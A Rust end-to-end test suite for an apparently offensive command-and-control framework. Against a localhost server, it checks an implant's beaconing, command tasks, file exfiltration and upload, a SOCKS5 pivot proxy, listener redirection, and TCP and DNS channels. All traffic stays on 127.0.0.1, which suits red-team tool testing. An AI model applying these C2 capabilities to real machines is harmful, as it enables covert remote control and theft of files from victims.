//! End-to-end C2 round trip: start a real server listener on an ephemeral
//! port, connect an in-process BeaconRuntime implant, queue a task, and assert
//! the result comes back over the real HTTP channel.

use std::io::{Read, Write};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};

use axum::{
    extract::{Request, State},
    middleware::Next,
    response::{IntoResponse, Response},
};
use nw_implant::runtime::{BeaconRuntime, Profile};
use nw_server::{ServerState, queue::TaskQueue, server, session::SessionRegistry};

fn free_port() -> u16 {
    std::net::TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port()
}

#[tokio::test]
async fn http_c2_round_trip() {
    let _ = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .try_init();
    let psk: Vec<u8> = b"e2e-psk".to_vec();
    let port = free_port();
    let endpoint = format!("http://127.0.0.1:{}", port);

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let state = ServerState { registry: registry.clone(), queue: queue.clone(), psk: Arc::new(psk.clone()), files: nw_server::filestore::FileStore::default(), uploads: nw_server::uploadstore::UploadStore::default() };

    let bind = format!("127.0.0.1:{}", port);
    let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });

    // Give the listener a beat to bind.
    tokio::time::sleep(Duration::from_millis(200)).await;

    let profile = Profile {
        endpoint: endpoint.clone(),
        interval: Duration::from_millis(100),
        jitter: Duration::ZERO,
        hostname: "testlab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 1234,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    // The implant registers on its first tick; give it time, then queue a task.
    wait_for_session(&registry).await;
    let sid = registry.list()[0].id;
    let task_id = queue
        .push(&sid, "printf".into(), vec!["roundtrip-ok".into()], 5000)
        .expect("queued");

    // Poll the queue until the result is delivered by the implant.
    let mut waited = Duration::ZERO;
    let result = loop {
        if let Some(r) = queue.take_result(&sid, &task_id) {
            break r;
        }
        assert!(waited < Duration::from_secs(10), "timed out waiting for task result");
        tokio::time::sleep(Duration::from_millis(100)).await;
        waited += Duration::from_millis(100);
    };

    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
    assert_eq!(String::from_utf8_lossy(&result.stdout), "roundtrip-ok");

    // Stop the implant, then drop the server.
    runtime.trigger_stop();
    let _ = beacon.await;
    server_handle.abort();
}

#[tokio::test]
async fn download_streams_a_remote_file_to_the_server() {
    let _ = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .try_init();
    let psk: Vec<u8> = b"dl-e2e-psk".to_vec();
    let port = free_port();
    let endpoint = format!("http://127.0.0.1:{}", port);

    // A source file on the "implant" side.
    let src = std::env::temp_dir().join("nw-dl-src.dat");
    let payload: Vec<u8> = (0..=255).cycle().take(5000).collect();
    std::fs::write(&src, &payload).unwrap();

    // A dedicated downloads dir so we can assert the file landed.
    let dl_dir = std::env::temp_dir().join(format!("nw-dl-out-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dl_dir);

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let state = ServerState {
        registry: registry.clone(),
        queue: queue.clone(),
        psk: Arc::new(psk.clone()),
        files: nw_server::filestore::FileStore::new(dl_dir.clone()),
        uploads: nw_server::uploadstore::UploadStore::default(),
    };

    let bind = format!("127.0.0.1:{}", port);
    let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });
    tokio::time::sleep(Duration::from_millis(200)).await;

    let profile = Profile {
        endpoint: endpoint.clone(),
        interval: Duration::from_millis(50),
        jitter: Duration::ZERO,
        hostname: "dllab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 999,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    wait_for_session(&registry).await;
    let sid = registry.list()[0].id;
    let task_id = queue
        .push(&sid, "nw/download".into(), vec![src.to_str().unwrap().to_string()], 60_000)
        .expect("queued");

    let result = wait_for_result(&queue, &sid, &task_id).await;
    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
    assert!(String::from_utf8_lossy(&result.stdout).contains("downloaded"));

    // The server should have the full file under its downloads dir.
    let out_path = dl_dir.join(format!("{}-nw-dl-src.dat", sid));
    let written = std::fs::read(&out_path).unwrap_or_default();
    assert_eq!(written, payload, "downloaded bytes must match source");

    runtime.trigger_stop();
    let _ = beacon.await;
    server_handle.abort();
    std::fs::remove_file(&src).ok();
    let _ = std::fs::remove_dir_all(&dl_dir);
}

#[tokio::test]
async fn upload_streams_a_local_file_to_the_implant() {
    let _ = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .try_init();
    let psk: Vec<u8> = b"up-e2e-psk".to_vec();
    let port = free_port();
    let endpoint = format!("http://127.0.0.1:{}", port);

    // A source file on the "server/operator" side to push out.
    let src = std::env::temp_dir().join("nw-up-src.dat");
    let payload: Vec<u8> = (0..=255).cycle().take(5000).collect();
    std::fs::write(&src, &payload).unwrap();

    let dest = std::env::temp_dir().join(format!("nw-up-dest-{}.dat", std::process::id()));
    let _ = std::fs::remove_file(&dest);

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let uploads = nw_server::uploadstore::UploadStore::default();
    let state = ServerState {
        registry: registry.clone(),
        queue: queue.clone(),
        psk: Arc::new(psk.clone()),
        files: nw_server::filestore::FileStore::default(),
        uploads: uploads.clone(),
    };

    let bind = format!("127.0.0.1:{}", port);
    let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });
    tokio::time::sleep(Duration::from_millis(200)).await;

    // The operator uses a Dispatch over the SAME queue/uploads so the upload job
    // lands where the server's poll handler reads it.
    let dispatcher = nw_server::Dispatcher::new(registry.clone(), queue.clone(), uploads);

    let profile = Profile {
        endpoint: endpoint.clone(),
        interval: Duration::from_millis(50),
        jitter: Duration::ZERO,
        hostname: "uplab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 888,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    wait_for_session(&registry).await;
    let sid = registry.list()[0].id;
    dispatcher.set_interacted(Some(sid));
    let queued = match dispatcher.parse(&format!(
        "upload {} {}",
        src.to_str().unwrap(),
        dest.to_str().unwrap()
    )) {
        nw_server::dispatch::Outcome::TaskQueued { task_id, .. } => task_id,
        other => panic!("upload not queued: {other:?}"),
    };

    let result = wait_for_result(queue.as_ref(), &sid, &queued).await;
    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
    assert!(String::from_utf8_lossy(&result.stdout).contains("uploaded"));

    let written = std::fs::read(&dest).unwrap_or_default();
    assert_eq!(written, payload, "implant-side file must match the pushed source");

    runtime.trigger_stop();
    let _ = beacon.await;
    server_handle.abort();
    std::fs::remove_file(&src).ok();
    std::fs::remove_file(&dest).ok();
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn socks5_proxy_relays_traffic_through_the_implant() {
    let _ = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .try_init();
    let psk: Vec<u8> = b"socks-e2e-psk".to_vec();
    let c2_port = free_port();
    let endpoint = format!("http://127.0.0.1:{}", c2_port);

    // A TCP echo target "on the internet" the operator reaches via the proxy.
    let echo = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let echo_port = echo.local_addr().unwrap().port();
    let echo_task = tokio::spawn(async move {
        let (mut c, _) = echo.accept().await.unwrap();
        let mut b = [0u8; 64];
        let n = c.read(&mut b).await.unwrap();
        c.write_all(&b[..n]).await.unwrap();
    });

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let state = ServerState {
        registry: registry.clone(),
        queue: queue.clone(),
        psk: Arc::new(psk.clone()),
        files: nw_server::filestore::FileStore::default(),
        uploads: nw_server::uploadstore::UploadStore::default(),
    };
    let bind = format!("127.0.0.1:{}", c2_port);
    let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });
    tokio::time::sleep(Duration::from_millis(200)).await;

    let profile = Profile {
        endpoint: endpoint.clone(),
        interval: Duration::from_millis(50),
        jitter: Duration::ZERO,
        hostname: "sockslab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 777,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    wait_for_session(&registry).await;
    let sid = registry.list()[0].id;

    let socks_port = free_port();
    let task_id = queue
        .push(&sid, "nw/socks".into(), vec![socks_port.to_string()], 10_000)
        .expect("queued socks");
    let result = wait_for_result(&queue, &sid, &task_id).await;
    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));

    // Drive the implant's SOCKS5 proxy like a real client: no-auth handshake,
    // then CONNECT to the echo target, relay one message.
    let mut client = std::net::TcpStream::connect(("127.0.0.1", socks_port)).unwrap();
    client.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    client.set_write_timeout(Some(Duration::from_secs(5))).unwrap();
    client.write_all(&[0x05, 0x01, 0x00]).unwrap();
    let mut h = [0u8; 2];
    client.read_exact(&mut h).unwrap();
    assert_eq!(h, [0x05, 0x00]);
    client
        .write_all(&[0x05, 0x01, 0x00, 0x01, 127, 0, 0, 1, (echo_port >> 8) as u8, (echo_port & 0xff) as u8])
        .unwrap();
    let mut ack = [0u8; 10];
    client.read_exact(&mut ack).unwrap();
    assert_eq!(ack[1], 0x00, "CONNECT must succeed");
    client.write_all(b"via-socks").unwrap();
    let mut echoed = [0u8; 9];
    client.read_exact(&mut echoed).unwrap();
    assert_eq!(&echoed, b"via-socks");

    runtime.trigger_stop();
    let _ = beacon.await;
    server_handle.abort();
    echo_task.abort();
}

#[tokio::test]
async fn hashes_returns_sha256_of_a_remote_file() {
    let _ = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .try_init();
    let psk: Vec<u8> = b"hashes-e2e-psk".to_vec();
    let c2_port = free_port();
    let endpoint = format!("http://127.0.0.1:{}", c2_port);

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let state = ServerState {
        registry: registry.clone(),
        queue: queue.clone(),
        psk: Arc::new(psk.clone()),
        files: nw_server::filestore::FileStore::default(),
        uploads: nw_server::uploadstore::UploadStore::default(),
    };
    let bind = format!("127.0.0.1:{}", c2_port);
    let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });
    tokio::time::sleep(Duration::from_millis(200)).await;

    let profile = Profile {
        endpoint: endpoint.clone(),
        interval: Duration::from_millis(50),
        jitter: Duration::ZERO,
        hostname: "hashlab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 555,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    wait_for_session(&registry).await;
    let sid = registry.list()[0].id;

    // A file on the "implant" (same process in this e2e) with known bytes.
    let data = b"hello from naughtywolf hashes test\n";
    let dir = std::env::temp_dir().join(format!("nw-hashes-{}", std::process::id()));
    std::fs::create_dir_all(&dir).ok();
    let path = dir.join("target.bin");
    std::fs::write(&path, data).unwrap();

    let task_id = queue
        .push(&sid, "nw/hashes".into(), vec![path.to_str().unwrap().into()], 30_000)
        .expect("queued hashes");
    let result = wait_for_result(&queue, &sid, &task_id).await;
    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));

    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(data);
    let expect_hex: String = h.finalize().iter().map(|b| format!("{b:02x}")).collect();
    let stdout = String::from_utf8_lossy(&result.stdout);
    assert!(stdout.starts_with(&expect_hex), "stdout was: {stdout}");

    runtime.trigger_stop();
    let _ = beacon.await;
    server_handle.abort();
    std::fs::remove_file(&path).ok();
    std::fs::remove_dir_all(&dir).ok();
}

#[tokio::test]
async fn redirect_delivers_its_result_to_the_second_listener() {
    let psk: Vec<u8> = b"redirect-e2e-psk".to_vec();
    let first_port = free_port();
    let second_port = free_port();
    let first_endpoint = format!("http://127.0.0.1:{}", first_port);
    let second_endpoint = format!("http://127.0.0.1:{}", second_port);

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let first = FirstListenerState {
        total: Arc::new(AtomicUsize::new(0)),
        polls: Arc::new(AtomicUsize::new(0)),
        register_ready: Arc::new(tokio::sync::Notify::new()),
        release_register: Arc::new(tokio::sync::Notify::new()),
    };
    let first_app = nw_server::channels::router(registry.clone(), queue.clone(), psk.clone())
        .layer(axum::middleware::from_fn_with_state(first.clone(), reject_followup_polls));
    let first_bind = format!("127.0.0.1:{}", first_port);
    let first_listener = tokio::net::TcpListener::bind(&first_bind).await.unwrap();
    let first_handle = tokio::spawn(async move { axum::serve(first_listener, first_app).await });

    let second_state = ServerState {
        registry: registry.clone(),
        queue: queue.clone(),
        psk: Arc::new(psk.clone()),
        files: nw_server::filestore::FileStore::default(),
        uploads: nw_server::uploadstore::UploadStore::default(),
    };
    let second_bind = format!("127.0.0.1:{}", second_port);
    let second_handle = tokio::spawn(async move { server::serve(second_state, &second_bind).await });

    let profile = Profile {
        endpoint: first_endpoint,
        interval: Duration::from_millis(50),
        jitter: Duration::ZERO,
        hostname: "redirect-testlab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 4321,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    tokio::time::timeout(Duration::from_secs(3), first.register_ready.notified())
        .await
        .expect("register did not reach the first listener");
    let sid = registry.list()[0].id;
    let task_id = queue
        .push(&sid, "nw/sethost".into(), vec![second_endpoint.clone()], 5000)
        .expect("queued redirect");
    first.release_register.notify_one();

    let result = wait_for_result(&queue, &sid, &task_id).await;
    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
    assert!(String::from_utf8_lossy(&result.stdout).contains(&second_endpoint));
    assert_eq!(first.polls.load(Ordering::SeqCst), 1);

    runtime.trigger_stop();
    let _ = beacon.await;
    first_handle.abort();
    second_handle.abort();
}

#[derive(Clone)]
struct FirstListenerState {
    total: Arc<AtomicUsize>,
    polls: Arc<AtomicUsize>,
    register_ready: Arc<tokio::sync::Notify>,
    release_register: Arc<tokio::sync::Notify>,
}

async fn reject_followup_polls(
    State(first): State<FirstListenerState>,
    request: Request,
    next: Next,
) -> Response {
    if request.uri().path() == "/c2/checkin" {
        // First checkin on the listener is the register; everything after is a
        // poll. Reject the 2nd+ poll so the implant's redirect lands on the
        // second listener.
        let first_here = first.total.fetch_add(1, Ordering::SeqCst) == 0;
        if first_here {
            let resp = next.run(request).await;
            first.register_ready.notify_one();
            first.release_register.notified().await;
            return resp;
        } else if first.polls.fetch_add(1, Ordering::SeqCst) > 0 {
            return axum::http::StatusCode::SERVICE_UNAVAILABLE.into_response();
        }
    }
    next.run(request).await
}

async fn wait_for_session(registry: &SessionRegistry) {
    let mut waited = Duration::ZERO;
    while registry.list().is_empty() {
        assert!(waited < Duration::from_secs(10), "implant never registered");
        tokio::time::sleep(Duration::from_millis(100)).await;
        waited += Duration::from_millis(100);
    }
}

async fn wait_for_result(queue: &TaskQueue, sid: &uuid::Uuid, task_id: &uuid::Uuid) -> nw_profile::msgs::TaskResult {
    let mut waited = Duration::ZERO;
    loop {
        if let Some(result) = queue.take_result(sid, task_id) {
            return result;
        }
        assert!(waited < Duration::from_secs(3), "timed out waiting for task result");
        tokio::time::sleep(Duration::from_millis(50)).await;
        waited += Duration::from_millis(50);
    }
}

#[tokio::test]
async fn raw_tcp_c2_round_trip() {
    let _ = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .try_init();
    let psk: Vec<u8> = b"tcp-e2e-psk".to_vec();
    let port = free_port();
    let endpoint = format!("tcp://127.0.0.1:{}", port);

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let state = ServerState {
        registry: registry.clone(),
        queue: queue.clone(),
        psk: Arc::new(psk.clone()),
        files: nw_server::filestore::FileStore::default(),
        uploads: nw_server::uploadstore::UploadStore::default(),
    };

    let bind = format!("127.0.0.1:{}", port);
    let server_handle = tokio::spawn(async move { nw_server::serve_tcp(state, bind).await });

    tokio::time::sleep(Duration::from_millis(200)).await;

    let profile = Profile {
        endpoint: endpoint.clone(),
        interval: Duration::from_millis(100),
        jitter: Duration::ZERO,
        hostname: "tcplab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 777,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk.clone()));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    wait_for_session(&registry).await;
    let sid = registry.list()[0].id;
    let task_id = queue
        .push(&sid, "printf".into(), vec!["tcp-roundtrip-ok".into()], 5000)
        .expect("queued");

    let result = wait_for_result(&queue, &sid, &task_id).await;
    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
    assert_eq!(String::from_utf8_lossy(&result.stdout), "tcp-roundtrip-ok");

    runtime.trigger_stop();
    let _ = beacon.await;
    server_handle.abort();
}

#[tokio::test]
async fn raw_dns_c2_round_trip() {
    let _ = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .try_init();
    let psk: Vec<u8> = b"dns-e2e-psk".to_vec();
    let port = free_port();
    let endpoint = format!("dns://127.0.0.1:{}", port);

    let registry = Arc::new(SessionRegistry::new());
    let queue = Arc::new(TaskQueue::new());
    let bind = format!("127.0.0.1:{}", port);
    let server_handle = tokio::spawn({
        let registry = registry.clone();
        let queue = queue.clone();
        let psk = psk.clone();
        async move { nw_server::serve_dns(registry, queue, psk, bind).await }
    });

    tokio::time::sleep(Duration::from_millis(200)).await;

    let profile = Profile {
        endpoint: endpoint.clone(),
        interval: Duration::from_millis(100),
        jitter: Duration::ZERO,
        hostname: "dnslab".into(),
        username: "tester".into(),
        os: "test-os".into(),
        arch: "test-arch".into(),
        pid: 888,
        addr: "127.0.0.1".into(),
    };
    let runtime = Arc::new(BeaconRuntime::new(profile, psk));
    let implanted = runtime.clone();
    let beacon = tokio::spawn(async move { implanted.run().await });

    wait_for_session(&registry).await;
    let sid = registry.list()[0].id;
    let task_id = queue
        .push(&sid, "printf".into(), vec!["dns-roundtrip-ok".into()], 5000)
        .expect("queued");

    let result = wait_for_result(&queue, &sid, &task_id).await;
    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
    assert_eq!(String::from_utf8_lossy(&result.stdout), "dns-roundtrip-ok");

    runtime.trigger_stop();
    let _ = beacon.await;
    server_handle.abort();
}
